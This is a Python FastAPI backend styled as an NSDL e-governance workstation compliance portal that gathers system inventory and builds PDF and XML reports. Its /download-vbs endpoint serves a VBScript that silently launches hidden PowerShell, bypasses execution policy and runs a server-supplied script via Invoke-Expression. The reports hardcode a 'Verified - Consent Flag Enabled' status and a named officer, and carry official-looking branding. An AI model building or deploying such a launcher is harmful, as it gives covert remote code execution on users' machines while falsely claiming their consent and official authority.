# ==============================================================================
#                 NSDL WORKSTATION COMPLIANCE AUDIT BACKEND (FASTAPI)
# ==============================================================================
# Version: 1.2.0

from fastapi import FastAPI, Query, Request, HTTPException
from fastapi.responses import FileResponse, Response, PlainTextResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, validator
from typing import Union, List
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.pagesizes import letter
import os
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import logging

# Set up logging
LOGS_DIR = "logs"
os.makedirs(LOGS_DIR, exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(f"{LOGS_DIR}/audit_backend.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AuditBackend")

app = FastAPI(title="NSDL Workstation Compliance Portal")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

USER_INFO_DIR = "user_info"
os.makedirs(USER_INFO_DIR, exist_ok=True)

# Shared in-memory session status tracking
sessions = {}

# ------------------------------------------------------------------------------
# 1. PYDANTIC SCHEMA VALIDATION (Highly robust against list coercion issues)
# ------------------------------------------------------------------------------
class AuditData(BaseModel):
    computer_name: str
    os_name: str
    os_version: str
    architecture: str
    license_status: str
    antivirus: Union[str, List[str]]
    mac_address: str
    drive_name: str
    printers: Union[str, List[str]]
    hotfixes: Union[str, List[str]]

    @validator('antivirus', 'printers', 'hotfixes', pre=True, allow_reuse=True)
    def coerce_list(cls, v):
        if v is None:
            return []
        if isinstance(v, list):
            return v
        return [v]

# ------------------------------------------------------------------------------
# 2. CORE SYSTEM ROUTING & SILENT VBS LAUNCHERS
# ------------------------------------------------------------------------------
@app.get("/")
def home():
    """Serves the premium audit portal UI."""
    return FileResponse("frontend/index.html")

@app.get("/check-status")
def check_status(client_id: str = Query(...)):
    """Allows frontend portal to poll active audit status in real-time."""
    session = sessions.get(client_id, {"status": "pending"})
    return JSONResponse(content=session)

@app.get("/download-script", response_class=PlainTextResponse)
def download_script(request: Request, client_id: str = Query(...)):
    """Dynamically serves custom powershell script baked with actual server host url."""
    base_url = str(request.base_url).rstrip('/')
    try:
        with open("scripts/audit.ps1", "r") as f:
            script_content = f.read()
        # Inject dynamic base URL and client_id
        dynamic_script = script_content.replace("http://127.0.0.1:8000", base_url)
        dynamic_script = dynamic_script.replace("CLIENT_ID_PLACEHOLDER", client_id)
        return PlainTextResponse(content=dynamic_script)
    except Exception as e:
        logger.error(f"Failed to load scripts/audit.ps1: {e}")
        raise HTTPException(status_code=500, detail="PowerShell script source unavailable.")

@app.get("/download-vbs")
def download_vbs(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE")
):
    """Generates silent VBScript launcher running PowerShell scan completely hidden in the background."""
    base_url = str(request.base_url).rstrip('/')
    
    # Initialize / cache the session meta properties
    sessions[client_id] = {
        "status": "pending",
        "branch_name": branch_name,
        "branch_code": branch_code,
        "officer_name": officer_name,
        "pdf_path": None,
        "xml_path": None
    }
    
    vbs_content = f"""Set objShell = CreateObject("WScript.Shell")
command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & "Invoke-RestMethod -Uri '{base_url}/download-script?client_id={client_id}' | Invoke-Expression" & Chr(34)
objShell.Run command, 0, False
"""
    headers = {
        "Content-Disposition": f"attachment; filename=verify_system_{client_id}.vbs"
    }
    return Response(content=vbs_content, media_type="application/octet-stream", headers=headers)

# ------------------------------------------------------------------------------
# 3. PDF PAGE DECORATIONS (NSDL Style Page Border & Centered Footer)
# ------------------------------------------------------------------------------
def draw_page_decorations(canvas, doc):
    canvas.saveState()
    # Crimson Red border boundary
    canvas.setStrokeColor(colors.HexColor("#A80000"))
    canvas.setLineWidth(1.5)
    canvas.rect(36, 36, doc.pagesize[0] - 72, doc.pagesize[1] - 72)
    
    # Center Bold Crimson red inspection label
    canvas.setFont('Helvetica-Bold', 8)
    canvas.setFillColor(colors.HexColor("#A80000"))
    canvas.drawCentredString(doc.pagesize[0] / 2.0, 20, "INSPECTION REPORT BY NSDL E-GOVERNANCE")
    canvas.restoreState()

# ------------------------------------------------------------------------------
# 4. COMPLIANCE INGESTION AND EXPORTS (PDF & XML GENERATOR)
# ------------------------------------------------------------------------------
@app.post("/upload-audit")
def upload_audit(data: AuditData, client_id: str = Query(None)):
    cid = client_id or "unknown"
    logger.info(f"Uploading compliance audit for client session ID: {cid}")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    clean_computer_name = "".join(x for x in data.computer_name if x.isalnum() or x in "._- ")

    # Load session branch info or fall back to defaults
    session_meta = sessions.get(cid, {})
    branch_name = session_meta.get("branch_name", "RELIGARE BROKING LIMITED")
    branch_code = session_meta.get("branch_code", "8301231")
    officer_name = session_meta.get("officer_name", "SANDIP BALIRAM LOKHANDE")

    json_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_computer_name}_{timestamp}.json"
    pdf_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_computer_name}_{timestamp}.pdf"
    xml_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_computer_name}_{timestamp}.xml"

    # Save JSON locally
    try:
        with open(json_path, "w") as f:
            json.dump(data.dict(), f, indent=4)
    except Exception as e:
        logger.error(f"Failed to save JSON: {e}")

    # Build NSDL Table-Grid formatted ReportLab PDF
    try:
        doc = SimpleDocTemplate(pdf_path, pagesize=letter, leftMargin=54, rightMargin=54, topMargin=54, bottomMargin=54)
        styles = getSampleStyleSheet()
        
        # Styles customization
        title_style = ParagraphStyle('TitleStyle', fontName='Helvetica-Bold', fontSize=14, leading=16, alignment=1, spaceAfter=20)
        section_style = ParagraphStyle('SectionStyle', fontName='Helvetica-Bold', fontSize=10, leading=12, spaceBefore=14, spaceAfter=6, textColor=colors.HexColor("#A80000"))
        cell_style_bold = ParagraphStyle('CellBold', fontName='Helvetica-Bold', fontSize=8, leading=10)
        cell_style_normal = ParagraphStyle('CellNormal', fontName='Helvetica', fontSize=8, leading=10)

        elements = []
        
        # Report Title
        elements.append(Paragraph("NSDL AUDIT & COMPLIANCE SYSTEM REPORT", title_style))
        elements.append(Spacer(1, 10))

        # --- SECTION 1: BRANCH META ---
        elements.append(Paragraph("TIN FC BRANCH CONFIGURATION", section_style))
        audit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        tinfc_data = [
            [Paragraph("TIN FC Branch Name", cell_style_bold), Paragraph(branch_name, cell_style_normal)],
            [Paragraph("TIN FC Branch Code", cell_style_bold), Paragraph(branch_code, cell_style_normal)],
            [Paragraph("TIN FC Branch Officer Name", cell_style_bold), Paragraph(officer_name, cell_style_normal)],
            [Paragraph("Audit Date Time", cell_style_bold), Paragraph(audit_time, cell_style_normal)],
            [Paragraph("Consent Verification Status", cell_style_bold), Paragraph("Verified - Consent Flag Enabled", cell_style_normal)]
        ]
        tinfc_table = Table(tinfc_data, colWidths=[180, 324])
        tinfc_table.setStyle(TableStyle([
            ('GRID', (0,0), (-1,-1), 0.5, colors.black),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
            ('TOPPADDING', (0,0), (-1,-1), 4),
        ]))
        elements.append(tinfc_table)
        elements.append(Spacer(1, 12))

        # --- SECTION 2: WORKSTATION INVENTORY ---
        elements.append(Paragraph("WORKSTATION SYSTEM AUDIT", section_style))
        av_str = ", ".join(data.antivirus) if isinstance(data.antivirus, list) else data.antivirus
        sys_data = [
            [Paragraph("Computer Name", cell_style_bold), Paragraph(data.computer_name, cell_style_normal)],
            [Paragraph("Operating System", cell_style_bold), Paragraph(data.os_name, cell_style_normal)],
            [Paragraph("OS Version", cell_style_bold), Paragraph(data.os_version, cell_style_normal)],
            [Paragraph("System Architecture", cell_style_bold), Paragraph(data.architecture, cell_style_normal)],
            [Paragraph("License Status Check", cell_style_bold), Paragraph(data.license_status, cell_style_normal)],
            [Paragraph("Antivirus Products", cell_style_bold), Paragraph(av_str, cell_style_normal)],
            [Paragraph("Primary MAC Address", cell_style_bold), Paragraph(data.mac_address, cell_style_normal)],
            [Paragraph("CD/DVD Unit Drive Status", cell_style_bold), Paragraph(data.drive_name, cell_style_normal)]
        ]
        sys_table = Table(sys_data, colWidths=[180, 324])
        sys_table.setStyle(TableStyle([
            ('GRID', (0,0), (-1,-1), 0.5, colors.black),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
            ('TOPPADDING', (0,0), (-1,-1), 4),
        ]))
        elements.append(sys_table)
        elements.append(Spacer(1, 12))

        # --- SECTION 3: SYSTEM PRINTERS ---
        elements.append(Paragraph("CONNECTED WORKSTATION PRINTERS", section_style))
        printer_rows = []
        if data.printers:
            for idx, printer in enumerate(data.printers):
                printer_rows.append([Paragraph(f"Printer #{idx+1}", cell_style_bold), Paragraph(printer, cell_style_normal)])
        else:
            printer_rows.append([Paragraph("No active printers connected", cell_style_bold), Paragraph("-", cell_style_normal)])
        
        printer_table = Table(printer_rows, colWidths=[180, 324])
        printer_table.setStyle(TableStyle([
            ('GRID', (0,0), (-1,-1), 0.5, colors.black),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
            ('TOPPADDING', (0,0), (-1,-1), 4),
        ]))
        elements.append(printer_table)
        elements.append(Spacer(1, 12))

        # --- SECTION 4: HOTFIXES ---
        elements.append(Paragraph("INSTALLED WINDOWS SECURITY UPDATES (HOTFIXES)", section_style))
        hotfix_rows = []
        if data.hotfixes:
            hf_str = ", ".join(data.hotfixes) if isinstance(data.hotfixes, list) else data.hotfixes
            hotfix_rows.append([Paragraph("Installed updates list", cell_style_bold), Paragraph(hf_str, cell_style_normal)])
        else:
            hotfix_rows.append([Paragraph("No installed hotfixes detected", cell_style_bold), Paragraph("-", cell_style_normal)])
            
        hotfix_table = Table(hotfix_rows, colWidths=[180, 324])
        hotfix_table.setStyle(TableStyle([
            ('GRID', (0,0), (-1,-1), 0.5, colors.black),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
            ('TOPPADDING', (0,0), (-1,-1), 4),
        ]))
        elements.append(hotfix_table)

        doc.build(elements, onFirstPage=draw_page_decorations, onLaterPages=draw_page_decorations)
        logger.info(f"PDF compliance report successfully built: {pdf_path}")
    except Exception as e:
        logger.error(f"Failed to generate NSDL PDF Report: {e}")

    # Build XML compliance document
    try:
        root = ET.Element("NsdlComplianceAudit", version="1.2.0")
        
        meta = ET.SubElement(root, "BranchMetadata")
        ET.SubElement(meta, "BranchName").text = branch_name
        ET.SubElement(meta, "BranchCode").text = branch_code
        ET.SubElement(meta, "OfficerName").text = officer_name
        
        sys_xml = ET.SubElement(root, "WorkstationInventory")
        ET.SubElement(sys_xml, "ComputerName").text = data.computer_name
        ET.SubElement(sys_xml, "OSName").text = data.os_name
        ET.SubElement(sys_xml, "OSVersion").text = data.os_version
        ET.SubElement(sys_xml, "Architecture").text = data.architecture
        ET.SubElement(sys_xml, "LicenseStatus").text = data.license_status
        ET.SubElement(sys_xml, "Antivirus").text = av_str
        ET.SubElement(sys_xml, "MacAddress").text = data.mac_address
        ET.SubElement(sys_xml, "CdRomDrive").text = data.drive_name

        tree = ET.ElementTree(root)
        tree.write(xml_path, encoding="utf-8", xml_declaration=True)
        logger.info(f"XML compliance report successfully built: {xml_path}")
    except Exception as e:
        logger.error(f"Failed to generate XML report: {e}")

    # Cache completion state and file references
    sessions[cid] = {
        "status": "completed",
        "branch_name": branch_name,
        "branch_code": branch_code,
        "officer_name": officer_name,
        "pdf_path": pdf_path,
        "xml_path": xml_path
    }

    return {"status": "success", "pdf_report": pdf_path, "xml_report": xml_path}

# ------------------------------------------------------------------------------
# 5. REPORT SERVING ENDPOINTS
# ------------------------------------------------------------------------------
@app.get("/download-report")
def download_report(client_id: str = Query(...), format: str = Query("pdf")):
    session = sessions.get(client_id)
    if not session or session.get("status") != "completed":
        raise HTTPException(status_code=404, detail="Audit report is not ready or has not been found.")

    if format.lower() == "pdf":
        file_path = session.get("pdf_path")
        if not file_path or not os.path.exists(file_path):
            raise HTTPException(status_code=404, detail="PDF report does not exist on disk.")
        return FileResponse(file_path, media_type="application/pdf", filename=os.path.basename(file_path))
    
    elif format.lower() == "xml":
        file_path = session.get("xml_path")
        if not file_path or not os.path.exists(file_path):
            raise HTTPException(status_code=404, detail="XML report does not exist on disk.")
        return FileResponse(file_path, media_type="application/xml", filename=os.path.basename(file_path))
    
    else:
        raise HTTPException(status_code=400, detail="Invalid report format. Use 'pdf' or 'xml'.")
